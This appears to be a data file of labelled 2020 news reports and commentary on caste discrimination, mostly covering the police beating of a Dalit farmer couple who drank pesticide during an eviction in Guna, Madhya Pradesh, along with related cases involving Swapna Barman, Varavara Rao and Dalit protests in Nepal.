1,"We reported in our spring newsletter that an Asian dating website was responsible by means of an algorithm to exclude Scheduled Castes (Dalits) from certain matches. Shaadi.com, a marriage site for the Indian community in the UK, the US and elsewhere, is back in the headlines again. Originally, subscribers to the website were asked how dark or light their skin tone was – it is commonly believed that a darker skin tone denotes a lower caste and that lighter skin tones are more desirable. Following the Black Lives Matter movement, a subscriber from the US started a petition to remove the colour filter from the website, and after garnering more than 1500 signatures in just 14 hours, Shaadi.com decided to remove it. While this is a victory, it is disturbing that several subscribers have reported that previously they were rejected by potential matches, based on their skin tone. Although the severity of caste discrimination suffered amongst the Diaspora in the west is milder in comparison to those in South Asia, there is obviously much that still has to be done to tackle both conscious and unconscious bias. On the bharatmatrimony.com website, it is still possible to search for partners by caste, and while many members in the UK add that caste is no bar to finding a suitable partner, not all of them do. For those who refuse to put their caste down, we do not know whether this is embarrassment or concern over not finding someone should they mention that they are a member of a Scheduled Caste, or whether it is because caste is genuinely not an issue that concerns them when looking for a spouse. Whether we like it or not, caste remains an identifier for some in the diaspora – and skin tone just another method of making a judgement.

1,"By Saurabh Sharma LUCKNOW, India, July 16 (Thomson Reuters Foundation) - A lower-caste Dalit couple in India attempted suicide after police beat them and destroyed their crops, triggering calls on Thursday for an end to brutal evictions of poor minorities. An online video showing half a dozen police officers dragging and beating the couple with sticks to evict them from government-owned land in central Madhya Pradesh state has been viewed more than 1 million times since it took place on Tuesday.  हमारी लड़ाई इसी सोच और अन्याय के ख़िलाफ़ है। pic.twitter.com/egGjgY5Awm The couple consumed pesticide moments after the eviction and were rushed to hospital, S. Vishwanath, head of the local administration, told a news conference late on Wednesday, hours before he and the police chief were removed from their posts. ""To force a couple to attempt suicide by damaging their crops ... is most cruel and shameful,"" Kumari Mayawati, a Dalit political leader, said on Twitter. ""Nationwide condemnation of the incident is natural. Government should take strict action."" Government and senior police officials were not immediately available for comment. The eviction was part of a drive to stop encroachment on land and the area the couple was farming had been allotted for the construction of a college, said a policeman who declined to be named as he was not authorised to talk to the media. Six police officers were suspended on Thursday and the state government has ordered an investigation into the incident. India banned discrimination based on caste - a system which divided Hindus into groups based on occupations - in 1955. But centuries-old biases against lower-caste groups persist, making it harder for them to access education, jobs and homes. A growing population and rising pressure on land to build homes, highways and industry is triggering conflicts, with lower-caste citizens often facing eviction, particularly in rural areas where biases are most entrenched, campaigners say. More than half of India's lower-caste population is landless, according to census data. Several states have laws aimed at giving land to Dalits but few have produced results, according to Dalit activists and leaders. ""They were begging the police to not destroy their crops as they were in debt ... but the police did not listen to them,"" N. Kumar, a neighbour of the couple, told the Thomson Reuters Foundation by phone from Nankhedi village. He said the couple had asked the police to wait two months so that they could harvest their crops. Ram Prakash Sharma, a tribal and Dalits' rights activist in Madhya Pradesh, described the incident as ""unfortunate"" and urged authorities to do more to help the couple. ""The Dalits in Madhya Pradesh are one of the most backward people and they do not own farming land,"" he said. ""The government must provide this couple a house and employment so that they can feed their kids and not die of starvation.""

A video has been widely shared of the police appearing to beat the pair in the state of Madhya Pradesh, as their distraught children cry nearby. Opposition parties say it is typical of the treatment of Dalits, who are at the bottom of the Hindu caste system. Despite laws to protect them, they still face widespread discrimination. A video shows the police hitting a Dalit man with batons as his wife and others try to save him. The couple said they had leased the land for farming and would die if they were evicted. Officials said that the couple, who were being removed from a plot of government land granted for a college, drank pesticide in protest. They are reported to be recovering in hospital.

The death of Dalit girl triggered outrage in the area. It sparked strong protests as protesting mob raided the house of the orchard owner and ransacked it. Father had made Arjun Mishra, his wife Poonam Devi and Harisundar Mishra, a youth living with them as accused in his statement on basis of which an FIR was lodged.

1,"After widespread outrage over alleged police brutality against a Dalit farmer couple, caught on tape, during an anti-encroachment drive in Jaganpur Chak village of Guna district, six policemen, including a Sub-Inspector and two women constables were suspended Thursday. The suspension followed the transfer of Guna District Collector S Vishwanathan and Superintendent of Police Tarun Nayak late Wednesday. On Tuesday afternoon, a couple of hours after a bulldozer began destroying the soybean crop on their land, Rajkumar Ahirwar and his wife Savitri consumed pesticide. While authorities alleged the couple had encroached on the 45-bigha plot meant for a government college, their relatives said Ahirwar had taken the land on lease from one Gabbu Pardhi and had even raised a loan to cultivate soybean. Sources said the couple had requested the anti-encroachment team to give them time till their crop was harvested but when the bulldozers rolled in, Savitri rushed inside their hut and consumed pesticide. A few minutes later, Rajkumar, 38, too followed her. Officials alleged that when they tried to take the unconscious couple to hospital, Rajkumar’s younger brother Shishupal and other relatives blocked them, leading to a lathi charge. The couple’s condition is stable. Read | MP Dalit couple’s suicide bid while resisting eviction from land: Here is what happened Photographs and videos of the incident went viral – some showing the couple’s six children crying next to their unconscious parents, and others with police raining blows and kicking Shishupal and a woman who tries to shield him. The Opposition Congress slammed the BJP government, with former CM Kamal Nath saying the incident is proof of “jungle raj” in the state. On Wednesday, Chief Minister Shivraj Singh Chouhan had ordered an inquiry into the circumstances leading to the suicide bid and the lathi charge. A magisterial probe has been ordered too. The State Human Rights Commission has asked for a report from the IG (Gwalior) and the Collector within three weeks. Among the six policemen suspended on Thursday are Sub-Inspector Ashok Singh Kushwah; constables Rajendra Sharma, Pawan Yadav and Narendra Rawat; and women constables Neetu Yadav and Rani Raghuvanshi. They have been told not to leave the headquarters without permission. On Thursday, IG (Gwalior Range) Rajababu Singh was also transferred but the government did not say if the shift had anything to do with the incident in Guna, a district that’s part of the Gwalior range. Government sources said the IG’s transfer was in connection with the upcoming by-elections since most of the constituencies fall in the region. While the videos show a woman constable raining blows on Shishupal and the woman, senior officials claimed Shishupal had attacked the woman constable. Posting a video of the police action, Congress leader Rahul Gandhi on Thursday tweeted, “Hamari ladai isi soch aur anyay ke khilaf hai (Our fight is against this very mentality and injustice)”. The Congress announced it would send a seven-member team led by former home minister Bala Bachchan and former urban development minister Jaivardhan Singh to Guna on Friday. A Congress team met the couple at the district hospital on Thursday and handed them a cheque of Rs 1.5 lakh. Accusing the Congress of conspiring to create tension, state BJP president V D Sharma said the incident had no caste angle but was a dispute between encroachers and a team from the administration. Bamori in Guna district is one of the 25 constituencies where bypolls crucial to the survival of the BJP government will be held. Most of these seats fall in the Gwalior-Chambal region that was rocked by violence in April 2018 in the wake of the Supreme Court ruling on the SC/ST (Prevention of Atrocities) Act. 📣 The Indian Express is now on Telegram.

1,"Press Note from Vara Vara Rao’s Family|Hyderabad| July 12, 2020 We, the family members of Varavara Rao, world-renowned Telugu revolutionary poet and public intellectual, who is incarcerated in Navi Mumbai’s Taloja Jail, are very much worried about his deteriorating health. His health condition has been scary for over six weeks now, ever since he was shifted in an unconscious state to JJ Hospital from Taloja Jail on May 28, 2020. Even as he was discharged from the hospital and sent back to jail three days later, there has been no improvement in his health and he is still in need of emergency heathcare. The immediate cause of concern now is that we are very much perturbed at the routine phone call we received from him on Saturday evening. Though the earlier two calls on June 24 and July 2 were also worrying with his weak and muffled voice, incoherent speech and abruptly jumping into Hindi. As an eloquent and articulate public speaker and writer in Telugu for over five decades, a Telugu teacher for four decades and known for his meticulous memory, this fumbling, incoherence and loss of memory were in themselves strange and frightening. But the latest call, on July 11 is much more worrisome as he did not answer straight questions on his health and went into a kind of delirious and hallucinated talk about the funeral of his father and mother, the events that happened seven decades and four decades ago respectively. Then his co-accused companion took the phone from him and informed us that he is not able to walk, go to toilet and brush his teeth on his own. We were also told that he is always hallucinating that we, family members, were waiting at the jail gate to receive him as he was getting released. His co-prisoner also said he needs immediate medical care for not only physical but also neurological issues. The confusion, loss of memory and incoherence are the results of electrolyte imbalance and fall of Sodium and Potassium levels leading to brain damage. This electrolyte imbalance may be fatal also. Taloja Jail Hospital is not at all equipped to handle this kind of serious ailment either in medical expertise or equipment. Thus it is highly required that he be shifted to a fully equipped super specialty hospital to save his life and prevent possible brain damage and risk to life due to electrolyte imbalance. At the present juncture we are leaving aside all the pertinent facts like, that the case against him is fabricated; he had to spend 22 months in jail as an undertrial with the process turned into punishment; his bail petitions got rejected at least five times now and even the bail petitions with his age, ill-health and Covid vulnerability as grounds were ignored. His life is the top most concern for us right now. Our present demand is to save his life. We demand the government to shift him to a better hospital or allow us to provide required medical care. We want to remind the government that it has no right to deny the right to life of any person, much less an undertrial prisoner.

1,"Scindia, on a telephone call, assured the couple that they will get full justice and need not worry about anything. On Thursday, 16 July, BJP leader and Rajya Sabha MP Jyotiraditya Scindia spoke to the Dalit farmer couple who had allegedly consumed pesticide in front of their children in Madhya Pradesh’s Guna because the police tried to destroy their crops and evict their family from a piece of 'government-owned’ land. Scindia, on a telephone call arranged by MP minister Mahendra Singh Sisodia, assured the couple that they will get full justice and need not worry about anything. He further added, “As soon as I got to know about the incident, I spoke to the chief minister and got the SP, Collector transferred.” The woman also asked for help and support for her children in terms of land being allotted to them. Ramkumar Ahirwar has been practising cultivation on a piece of land in Guna, which is reportedly owned by the state government. The Guna administration had ordered the setting up of a Model College on that piece of land. According to local media reports, there were previous attempts made to vacate the land. But, the administration had been unsuccessful in laying the foundation stone so far. Nirmal Rathore, Tehsildar of Guna City, who was present at the spot on the day of the incident, 14 July, and under whose watch the eviction drive was being carried out had said: “After taking measurement of the land, when the encroachment was being removed with JCB machines, the farmer couple tried to kill themselves by consuming poison.” Meanwhile, while narrating the events that transpired on 14 July, Ahirwar said, as per a report in The Indian Express: “I was left with no choice. I begged them not to destroy the crop but they did not stop. They did it last year too and my debts have gone up. One more round of destruction, and I knew I would have nothing to feed my six children.” Videos that have since surfaced on social media showed policemen thrashing other locals present at the spot, including children. Regarding the videos, IG Gwalior Range Raja Babu Singh had told The Quint, “The video has been clipped and is being shared as police wielding lathis on locals but the police was actually trying to shoo away the people who were resisting the cops from taking the unconscious farmer couple to the hospital.” The Indian Express reported that the police had claimed that Shishupal, Ahirwar’s younger brother, had attacked them. However, Shishupal reportedly said, “I did not assault anyone, I only pushed a constable because they were dragging my unconscious brother away. I told them not to do that and lift him properly. I got angry because they not only hit us with lathis but abused us and called us criminal Pardhis.” Meanwhile, the police have registered FIRs against Rajkumar, his wife Sabitri and other locals present at the spot. Among other charges, Section 353 of the IPC (Assault or criminal force to deter public servant from discharge of his duty, Section 309 of the IPC (Attempt to suicide) have been added to the FIR.

Police Brutality Did By Arré Bench Jul. 16, 2020 Just as the country was recovering from the news of the gruesome custodial deaths of Jayaraj and Bennicks in Tamil Nadu, another case of police high-handedness has come into the spotlight — this time from Madhya Pradesh’s Guna. A Dalit couple was reportedly left with no choice but to consume pesticide, in a bid to commit suicide, after the police allegedly approached their land on Tuesday and began destroying their crops, reports said.

My report for @TheQuint https://t.co/jA76YX9Vru — Asmita Nandy (@NandyAsmita) July 15, 2020  The administration claimed that the 5.5 acres of land, on which the couple had been farming, belonged to the government and labelled Ram Kumar Ahirwar and Savitri Devi as illegal encroachers. The Dalit couple, meanwhile, say they had been farming there for years. When they saw the police bulldozing their crops, they drank the pesticide, because they had a debt of ₹3 lakh, and saw no other way out. “We don’t know whose land it is. We’ve been farming on it for a long time. When our standing crop was destroyed, we didn’t have any option but to kill ourselves,” Savitri Devi was quoted as saying. Following this act, they were beaten by officers, even as they were being dragged to an ambulance. A disturbing clip showing the assault was shared widely on social media. This is inhuman! How can people in uniform behave like this??!!!!!! https://t.co/EM7QRoxcbX — Kritika Kamra (@Kritika_Kamra) July 15, 2020  Another image of the Dalit couple’s children holding on to their parents’ unconscious bodies broke hearts on Twitter.

Arré Bench The Arré bench delivers stories that mattress. It hasn't achieved much sofar. But it's getting bedder.  Did you like it? Tell us what you think so we can give you more content you like : There are a slew of Instagram accounts run by media professionals dedicated to irritants and inside jokes of their job and industry. Lately, the conversation has slowly moved from the likes of “This client said this silly thing” to “My agency promotes mental health as long as it involves a yoga class, not reasonable work hours or manageable workloads. Haha. Fun.” This shift from LOLs and low-key whining to simmering aggression about toxic work culture during the pandemic is an eye-opener. We’ve all heard of Javed Khan, the rickshaw driver who sold his wife’s jewellery to convert his vehicle into a mobile ambulance. Though heartening, these tales of sacrifices make me gloomy. Each one of these positive stories come with the unsaid failure by the state or those in a better position to help. As the second wave continues to batter India, “woke” media organisations and ad agencies are all about well-being and mental health. The problem arises when this performance of empathy does not extend to their employees. Stories of bosses expecting you to work beyond office hours and making one demand after another on WhatsApp groups are all too common. There are several reasons why this second wave of the coronavirus may prove to be more lethal than the first one. Most of it has to do with Indian behavioural impulses. Indians haven’t been able to stand in a queue for the longest of time and it comes as no surprise that the pandemic-taught etiquette has worn off.

1,"Bhopal: A Dalit couple allegedly consumed poison while they were being evicted from their homes. An inquiry was ordered into the incident after police officials were seen using force on the deceased couple. A probe was ordered into the case by Shivraj Singh Chouhan, Chief Minister of Madhya Pradesh. According to a recent development, Chouhan also ordered the removal of Guna collector S Vishwanathan as well as Tarun Nayak, the SP of Guna district on Wednesday. The incident took place on Tuesday when an eviction drive was being carried on government land. The deceased man was identified as Rajkumar Ahirwar. Initially, the government had tweeted that the couple consumed poison after they were ""instigated by some people"". The 45-bigha government land in Jaganpur Chak was allotted to construct a college but the same land was encroached upon by Gappu Pardhi, a 'land mafia'. Gappu had allegedly rented the land to Rajkumar for farming. When the revenue officials went to the area for the encroachment, Rajkumar and his family raised an objection. In the video that went viral, the police could be seen thrashing the couple with lathis. Rajkumar and his wife were being kicked by a policewoman. A senior official quoted the CM and said, ""My government will take strong action against mafia and criminals but force is not to be used against common people. "" The incident came to light when a video of the cops using force on the family went viral on social media, The Times of India reported. In the video, the couple's children could be seen crying as they sat near the bodies of their parents. Home minister Narottam Mishra said that they have taken cognizance of the case. He said that a team comprising senior officials was sent to Guna to investigate the case."
1,"S Vishwanathan and SP Tarun Nayak were removed late on Wednesday night and a probe ordered after a Dalit farmer couple consumed pesticide to protest against an anti-encroachment drive, with police allegedly beating up a relative in response. A photograph of the children of Rajkumar Ahirwar and wife Savitri, who are stable, crying next to their unconscious mother on Tuesday, and a video showing police beating up Ahirwar’s younger brother had gone viral. Chief Minister Shivraj Singh Chouhan announced the action against the Collector and SP late on Wednesday night. Officials had arrived with a bulldozer at the 45-bigha Guna land reserved for a government post-graduate college, a major chunk of which has allegedly been encroached upon by Ahirwar. An attempt to clear it in November last year had been blocked by the family of Gappu Pardhi, who claims to own the land. Ahirwar told the officials that he had taken the land on lease and raised loan to cultivate it, and the family would have no option but to end their lives if their crop was destroyed. After the couple consumed pesticide, the police had booked them as well as others for trying to obstruct public officials on duty. Before he was removed, Collector Vishwanathan told The Indian Express that the police had to use force as Ahirwar’s relatives were not letting them take the couple to hospital. He also said the government had sanctioned Rs 12 crore for construction of the college, and any further delay could have resulted in it being shifted to another district. The Collector said the Ahirwars might have been instigated by someone to take the step, to stop the team from clearing the encroachment. Home Minister Narottam Mishra said senior officials from Bhopal will probe the incident and take action against whoever was responsible. The Congress said the video of police officers thrashing Ahirwar’s relatives and bundling them into a vehicle showed that it was “jungle raj” in Madhya Pradesh. “If there was some dispute about the land, it could have been solved legally… Will the government show similar alacrity in clearing encroachment on thousands of acres of government land by so-called jan sevaks (people’s servants)?” asked former CM Kamal Nath. 📣 The Indian Express is now on Telegram.

1,"Jyotirmoy Prodhani On 13 July one Ranger and his beat officer from the Belacoba Forest Range in Jalpaiguri, North Bengal, raided the house of Swapna Barman at Gomostopara village near Jalpaiguri for alleged possession of timber without papers. The Range Officer went there with a full platoon, at least three SUVs and half a dozen armed guards in combat fatigue with the preparedness of dealing with any dreaded forest mafia. They got down from the vehicles, rushed to Swapna Barman and triumphantly pointed guns at her as if they had just caught hold of a prized timber Don. During heavy monsoon, the river Teesta overflows and that is also the time when tree logs come floating which some of the local enthusiasts try to pull ashore. These logs are then sold at a much cheaper price in the local markets. This has been a phenomenon every monsoon. In fact, the floating logs have become so predictable that it has become a sort of monsoon festival to collect logs from the Teesta. As the water recedes, it even becomes easier to drag the logs from the dry river banks. The forest department, on the other hand, is not known to have chased the logs though most of the logs are well sectioned tree stems apparently get drifted from the piles of felled logs from inside the forests. One reason of this inertia on the part of the department being that too much of monitoring on the drifted logs might well open up a cupboard for more skeletons to tumble down as most of these logs are unaccounted timbers ostensibly felled as part of the irregular chopping of forest trees. But this time for the lone pair of such logs there was extraordinary eagerness and hyperactive drives on the part of the forest department. Therefore, this time they had raided the house of Swapna Barman, a daughter of a rickshaw puller, a native Rajbanshi Schedule Caste girl, whose family, till the other day, just could manage two square meals a day. But the situation slightly changed when Swapna Barman became the only Indian so far to have won the gold medal in the 2018 Asian Games in the event called heptathlon, an athletic event which, like many of them, most of her own villagers never heard of till she won the medal. Earlier, she had also won a gold medal in the Asian Athletic Championship in 2017 and got a silver medal in the SAF Games in 2016. Being the champion of one of the toughest athletic events she soon became well-known all over the country. For her extraordinary sporting achievements, she was also conferred with the coveted Arjuna Award. In the same Asiad Games, Assamese girl, Hima Das too won the gold medal in the 400 metres mixed and women’s relay. Young Hima Das deservedly became a celebrity in Assam. She has also been offered the job of DSP by the state government. In stark contrast to such glorious journey, Swapna Barman received a lukewarm welcome in Kolkata airport, the capital of her home state, moderate cash rewards from the state, and that is about it, where it all ended. Swapna belongs to the Koch Rajbanshi community, an indigenous repressed community recognized as Scheduled Caste in the state of West Bengal. But in the caste sensitive Bengal society, they have always been considered as pariahs, the low castes; the mainstream castes of Bengal even twisted a term to describe them as the Bahés, a Rajbanshi colloquial term of respect turned into a derogatory word by the mainstream Bengal to stigmatize the entire community. In a well-known Bengali novel (TeestaParerBrittanta) the community is symbolically represented by a loin clad semi civilized character, Bagharu. The popular novel has forever immortalized the image of naked Bagharu as the quintessential identity of a Rajbanshi in Bengal. Swapna Barman belongs to this community who are, for the mainstream Bengal, a ridiculous Bahé, a Bagharu, a semi civilized, quasi savage entity. Swapna Barman, as was revealed later, was constantly cajoled for about three days by an incumbent to buy a pair of floating logs from him. The desperate seller finally could dump two timber logs in the front yard of her thatched house. Like most of the people in the village, she finally agreed to purchase the log. But before even a lone plank of the wood could be used, the very next morning the forest department, on a ‘tip-off’ appeared in lightning speed and she was caught ‘red-handed’ dealing with illegal timber. This apparently highly ‘laudable’ forest activism generated a variety of responses. Predictably, the mainstream Bengal media turned the forest officers as the ultimate protagonists, the champions of forest protection. The arrival of the forest team was well organised and well equipped. Right on their landing, about half a dozen guards aimed their guns at Swapna and another half a dozen opened their mobiles and cameras to shoot videos of Swapna being ‘caught’, a scoop for the media that the forest officials brought to cover the event. Swapna was seen pleading the lady beat officer not to take videos of her because that would ruin her career which, she said, ‘I had painstakingly built for the last nine years. I toiled with my sweat and blood to reach here. Please don’t destroy me.’ Then came running her brother to stand in front and said it was he and not his sister who had got those logs. The half a dozen gunmen then turned their guns to the young boy, put him in a corner and forced him to squat on the ground, the boy then ended up looking helplessly at the barrels pointed at him. When Swapna ran to her brother to protect him from assault, then Panchali Ray, the ‘upright and highly active’ Beat officer dragged out Swapna to face the guns again. When Swapna was still pleading to listen to her, and let her explain, the ‘upright’ beat officer asked that famous question, ‘Tumi Key?’ (Who are you?) Surely before she came to the house of Swapna Barman, the most famous address of Gomostopara, she did not come as an ignorant as to where they were heading to for the catch. She could not be as dumb. In fact, she did not ask the question to get an answer; rather she had asked the question to give an answer. With that question she had instantly turned Swapna into a persona non-grata; with that question, the Beat officer had actually shown the wretched daughter of a rickshaw puller, a Rajbanshi bahe, a low caste pariah, as one with despicable social credibility, what she actually was. Swapna was reminded by that question that she was an expendable non-entity, no matter what might have been her achievements for the country. The Range Officer showed his officious authority by issuing her challans to show the papers of those logs within 30 days sharp and heroically zoomed off after giving precious bytes to the media which they had brought along to the spot. However, when they had departed with the satisfaction of having effectively ruined Swapna as the videos got uploaded within seconds to circulate Swapna’s ignominious fall, the same video also reached others- her community members, for whom Swapna was one of the very few reasons to be proud of. The incident turned to be a catalyst for one of the biggest mobilisations of the Koch Rajbanshi Kamatapuri community for a social cause in North Bengal. The incident even created a furore in Assam. The news story that followed in the mainstream media of Bengal screamed with the headline, Illegal Timber found at Swapna’s House. Curiously a moral brigade appeared who got ‘devastated’ at such reprehensible criminal act of Swapna Barman. Some even demanded setting up of a bigger commission to investigate Swapna’s connections with the illegal timber traders. In short, they demanded enquiries into the links of Swapna in plundering the forest of Bengal. The District President of the Sports Association, Mihir Bandopadhyay was quick to project Swapna as a criminal, ‘No matter how big a player she is, there must be exemplary actions against her’. One Purajit Bakshi Gupta of the District Sports Association seemed to have got equally devasted at Swapna’s crime, ‘As a sportsman, I am aghast and ashamed.’(in UttarbangaSambad, 14 July 2020) The same newspaper wrote with enthusiasm, ‘Swapna broke down in front of the officers and finally gave in to admit her crime.’ To the local Koch Rajbanshis the incident had given them a sense of déjà vu, for this has been too familiar a pattern through which the Rajbanshis have been routinely criminalized by the mainstream narrative of Bengal. The virtual spaces on the mobiles crowded with uproar as the Koch Rajbanshi youths set the social media platforms ablaze. The video of humiliated Swapna got viral. The political parties, TMC and BJP found themselves in a Catch 22 imbroglio, the 45% voter share of the Rajbanshis in North Bengal is too pricey to be given away on a platter to the opponents. The forthright and straight-to-your- face community leader, the firebrand Bongshi Badan Barman, the Chairman of Rajbanshi Unnayan Parishad, called up the Chief Minister, Mamata Banerjee, and warned that the situation would go out of control if those officers were not taken to task for having plotted against the biggest Rajabanshi sporting icon and the CM must ensure removal of all the false charges against her. Almost soon after, Mamata Banerjee came on camera to castigate the two forest officials, ordered their transfers and declared Swapna as innocent. But curiously, her own Forest Minister had earlier showered praise on the two forest officers for having nabbed one involved in illegal timber trading. However, after her announcement, Babul Supriyo, Union Minister of State for Environment and Forest, was enraged at the CM for having encouraged the ‘plunderer of the precious forest’ and for having discredited two of the most ‘pious forest officers of the country’- Sanjay Dutta and Panchali Ray. When Babul Supriyo’s video statement had gone viral, the BJP sensed trouble at the growing anger of the Rajbanshis against the party, so soon Babul Supriyo amended his statements. It turned into a macabre political comedy of sort. This incident, however, is not an isolated one, it is part of a pattern through which the Rajbanshis in Bengal have been criminalized, racially discriminated against and socially castigated. This incident was preceded by another event where a gang of extortionists had locked up a house in Coochbehar and driven out the owner of the house who was a Rajbanshi school teacher. The extortionists had demanded Rs. 10,00, 000/- (rupees ten lakhs) as a ‘donation’ to be paid by the teacher in order to get back his own house. All the three extortionists happened to be Hindu Bengalis who had to be arrested following extraordinary public protests and pressure. There are reasons to believe that Swapna’s incident might as well be a calculated act to remind the Rajbanshis that the land, the erstwhile Kamrup Kamata, in which they have been living for centuries, no longer belonged to them. The transfer orders of the two high caste Bengali officials immediately followed by a volley of racist and despicable misogynist slurs in the social media against the community and Swapna Barman. The racist and misogynist slurs were so vile and abusive that several Koch Rajbanshi women organisations from Jalpaiguri had to approach the cyber cells to formally lodge complaints. The Swapna Barman episode was followed by another tragic incident in North Dinajpur, where, on 19 July, a 16 years old Rajbanshi school student was allegedly raped and brutally murdered. As the protest erupted the Bengal media reported the incident as the protest of irate people at the ‘death of a girl’. This time the suspected perpetrator appeared to be a Muslim following the recovery of his mobile and his bicycle at the spot. Officially the incident was quickly termed as suicide. Since the perpetrator appeared to be a Muslim, the BJP got overactive and turned into the biggest supporter of the Rajbanshis. The body of the rape and murder suspect was found a couple of days later. This time the TMC government turned too swift to arrest the father, the uncle and younger brother of the 16 years old rape and murder victim. Earlier, on 12 July, the Rajbanshi MLA from Hemtabad constituency in North Dinajpur, Debendranath Ray, was found hanging in the verandah of a shop in the market. Nobody believes the official version that he went to the market and committed suicide. This is symptomatic of Kafkaesque existential experience of the Koch Rajbanshis in Bengal who have been brutally subjected to repressions and been reduced not just into peripheral disjuncts but into effective non-entities. The author teaches at North-Eastern Hill University, (NEHU) Shillong. It’s a powerful story. In the world of prejudices against Dalits and the tribal, how easy it becomes to malign the rarest of the jewels that the community may produce once in their life time. This is not how the affluent criminals are dealt with."
1,"Everything is Written Here A Dalit couple who allegedly attempted suicide in front of their children and police officers on seeing a JCB machine crush their standing crop was brutally assaulted by the policemen in Madhya Pradesh’s Jagatpur Chak area of Guna district on Tuesday. Ramkumar Ahirwar and his wife Savitri resisted the government team’s bid to evict the couple’s family from a piece of “government-owned land” and went on to consume pesticides. Following this, the policmen assaulted the farmer couple and forcibly dragged them into an ambulance. Ram Kumar’s mother and brother, who tried to save them, too were brutally assaulted by the cops. The Dalit couple’s children tried to rush to save their parents and the crying children were verbally abused and pushed away by the police. The duo were immediately shifted to the nearest government hospital and the latter is said to be critical. Former state Chief Minister Kamal Nath took a dig at BJP Government alleging it of running a “jungle raj” in the state. ये शिवराज सरकार प्रदेश को कहाँ ले जा रही है ? ये कैसा जंगल राज है ?गुना में कैंट थाना क्षेत्र में एक दलित किसान दंपत्ति पर बड़ी संख्या में पुलिसकर्मियों द्वारा इस तरह बर्बरता पूर्ण लाठीचार्ज।1/3 pic.twitter.com/lRgOFaWHPp If our crop is destroyed, we don’t have any other option but to kill ourselves: Family The Madhya Pradesh government had allotted the 20 bighas public land for construction of a Model Science College two years back, but the Dalit family has been practicing cultivation on it for a long time. “We don’t know whose land it is, we’ve been practicing cultivation on it for a long time. We had taken possession of this land after paying Rs 3 lakh to Gabbu Pardi, a real estate businessman. If our standing crop is destroyed, we don’t have any other option but to die by suicide. My husband have a debt burden of Rs 3 lakh. Who will pay it, the government or anybody else?” Ram Kumar’s wife Savitri Bai asked. FIR against family Meanwhile, instead of acting against the police brutality, the police have registered FIRs against the couple and other locals present at the spot. Among other charges, Section 353 of the IPC (Assault or criminal force to deter public servant from discharge of his duty, Section 309 of the IPC (Attempt to suicide) have been added to the FIR. Videos showed policemen thrashing the couple’s mother and children. Video- police beating, shame on you @ChouhanShivraj @JM_Scindiapic.twitter.com/0P7TxkYKkJ Speaking to The Quint, state IG Gwalior Range Raja Babu Singh defended the police action and said the video has been clipped and is being shared as police weilding lathis on locals but the police was actually trying to shoo away the people who were resisting the cops from taking the unconscious farmer couple to the hospital Govt removes Collector, SP from posts After facing massive criticism from opposition, the Guna SP and the Collector, who had ordered the eviction drive and supported police action, were removed from their posts on Wednesday. “We’ve probed the entire episode and checked the entire footage of the incident. Our team had to act only after the couple consumed pesticide and had to be rushed to the hospital. Had the team not acted, the couple could have died and more such cases could have taken place. The action was also essential as some others present on the spot were hell-bent on making the incident even more serious, but our priority was to rush the couple to the hospital. The couple is now out of danger,” Guna district collector S Vishwanath earlier told media. Narottam Mishra, State Home Minister in a tweet, said a high-level inquiry has been ordered into the matter."
1,"News 2 MIN READ Abha Lal, July 5, 2020, Kathmandu Share this article The state’s heavy-handed response to Dalit demands  The Dalit Struggle Committee of Dhanusa organized a protest on Thursday, July 2, in Janakpur to demand justice for Shambhu Sada and Raju Sada, two young Musahar men who died in police custody and a government quarantine facility, respectively, in the last month. Police fired tear gas and warning shots into the air, and charged the protestors with batons, seriously injuring Bijap Kumari Sada, Kalyan Kumar Sada, and Ramchandra Mahara--who are seeking treatment in hospitals in Janakpur and Dharan--and injuring at least a dozen others. One police officer is also reported to have been injured. Protests had been going on in Janakpur since mid-June, when Shambhu Sada, a 23-year-old truck driver from Sabaila Municipality was found hanging in the bathroom in police custody. Many, including Sada’s mother, believe that the police murdered Sada, while others think that the police drove him to suicide, through physical and emotional torture. Anger grew when a couple of weeks later, 16-year-old Raju Sada died for want of treatment for diarrhea while waiting for his COVID-19 test report in a government quarantine facility--he later tested negative for the virus. While government probes were launched to investigate both incidents, protestors say that necessary action was not taken in response to either of the events. According to Pacchu Majhi, a member of the Dalit Struggle Committee, the protestors’ immediate demands include compensation for both of the deceased mens’ families, and the suspension of police officers and medical supervisors held responsible for the deaths. According to journalist BP Sah, between 4,000 and 5,000 people, mostly from Dalit communities around Janakpur, had come to the town in tractors and gathered in Barabigha field for the protests. The protestors made their way from Ramananda Chowk to Piradi Road through to Madhes Bhawan, where Pacchu Majhi said that there was an altercation. “We had told the protestors to keep everything peaceful and not cause any trouble. The plan was to hold a minute of silence for Shambhu and Raju. One person threw a rock at the gate of the Chief Minister’s office, and that’s when the police became violent,” Majhi said. “We controlled the crowd and told the police officers that the remaining proceedings would be completely peaceful, but they started beating old people with sticks and firing shots in the air.” BP Sah told The Record that the police mostly beat the people who were at the tail end of the protesting crowd, who were mostly elderly people and women. Sah was detained for a couple of hours for allegedly “instigating” the protests. Janakpur SP Ramesh Basnet refused to answer questions about why a journalist was detained, but said that the protestors had created chaos and that force was necessary. “There was stone-pelting outside the Madhesh Bhawan and a vehicle’s window was also broken. That’s why we began the lathi-charge,” Basnet said. Both Sah and Majhi believe that the police escalated the violence even after the stone pelting stopped. “Shambhu’s mother made a narrow escape. She was directly in the line of fire outside Madhes Bhawan. The police were threatening people, telling them that they would go to their villages and shoot them,” Majhi said. Journalist Bhola Paswan, who has been following issues pertaining to Dalits closely for many years, told The Record that Dalit Struggle Committees across the country have been holding meetings about how to take the movement forward. “The anger from one incident has barely died down when another gruesome event happens. I think the protests are likely to continue to grow. I have been witnessing a lot of organizing happening,” Paswan said. :::::::: Abha Lal Abha Lal is a former Associate Editor and current contributor to The Record.

In response, police allegedly beat up a relative of the couple. A purported video of the incident, which showed the police hitting the Dalit man mercilessly with batons and his wife and others trying to save him, went viral on social media and sparked controversy.

""Even if there is a dispute regarding the land, it can be resolved legally, but in this way taking the law in hand, beating him, his wife, family and innocent children so ruthlessly, where is the justice?

Facing criticism from the opposition, Madhya Pradesh Chief Minister Shivraj Singh Chouhan had earlier ordered transfer of the collector and Superintendent of Police. The condition of the couple which had consumed pesticide is now stable, police said, adding that the police were compelled to use force against them as they resisted the eviction.

When officials asked them to vacate the field, they protested and drank pesticide at the behest of those who had encroached on the land, he claimed.

